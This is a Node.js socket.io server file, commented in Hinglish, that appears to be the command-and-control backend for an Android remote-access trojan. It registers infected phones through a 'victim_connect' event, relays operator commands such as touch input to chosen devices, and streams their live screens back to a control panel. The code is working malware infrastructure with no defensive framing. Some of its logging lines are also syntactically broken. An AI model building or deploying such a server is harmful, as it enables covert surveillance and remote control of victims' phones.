const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);

// CORS Policy (Cloud deployment ke liye zaroori)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Static files (panel.html) ko root folder se serve karein
app.use(express.static(__dirname));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Connected devices ki list manage karne ke liye
let devices = [];

io.on("connection", (socket) => {
    console.log([+] Ek naya user connect hua: ${socket.id});

    // ================== APK ke hisaab se BADLAV #1 ==================
    // APK 'victim_connect' bhejta hai, to hum use sunenge.
    socket.on('victim_connect', (data) => {
        const deviceId = socket.id; // Hum server ke socket.id ko hi device ki ID manenge
        const deviceName = data.deviceName || 'Unknown Device';
        const battery = data.battery || '--';
        
        // Check karo ki device pehle se list mein to nahi hai
        if (!devices.find(d => d.deviceId === deviceId)) {
            console.log([+] Device register hua: ${deviceName} (${deviceId}));
            devices.push({ deviceId, deviceName, battery });
        }
        
        // Sabhi panels ko updated device list bhejo
        io.emit('devices_list', devices);
    });

    // ================== APK ke hisaab se BADLAV #2 ==================
    // Panel se 'panel_command' aata hai, use APK ke command mein badlo.
    socket.on('panel_command', (command) => {
        if (!command.targetId) return;

        const eventType = command.type;
        const eventData = command.data || {};

        console.log([>] Panel se command aaya: '${eventType}', Bhej rahe hain -> ${command.targetId});
        
        // Panel se aaye command ko seedhe uss event naam se bhejo jise APK sun raha hai.
        // Jaise, panel 'touch_command' bhejega, to hum bhi aage 'touch_command' hi bhejenge.
        io.to(command.targetId).emit(eventType, eventData);
    });
    
    // ================== APK ke hisaab se BADLAV #3 ==================
    // APK 'live_screen' bhejta hai, to hum use sunenge.
    socket.on('live_screen', (data) => {
        // Panel 'live_screen_update' sunta hai, to data ko aage bhej do.
        // APK se deviceId nahi aa raha, to hum socket.id use karenge.
        data.deviceId = socket.id;
        io.emit('live_screen_update', data);
    });

    // ================== APK ke hisaab se BADLAV #4 ==================
    // APK 'heartbeat' bhejta hai, to hum use sunenge.
    socket.on('heartbeat', (data) => {
        const device = devices.find(d => d.deviceId === socket.id);
        if (device && data.battery) {
            device.battery = data.battery;
            // Panel ko 'status_update' aur 'devices_list' bhejo
            io.emit('status_update', { deviceId: socket.id, battery: data.battery });
            io.emit('devices_list', devices);
        }
    });

    // Connection tootne par
    socket.on("disconnect", () => {
        console.log([-] User disconnect hua: ${socket.id});
        // Device ko list se hatao
        devices = devices.filter(d => d.deviceId !== socket.id);
        // Sabhi panels ko updated list bhejo
        io.emit('devices_list', devices);
    });
});

// Dynamic Port (Render ke liye zaroori)
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(Server port ${PORT} par chal raha hai);
});
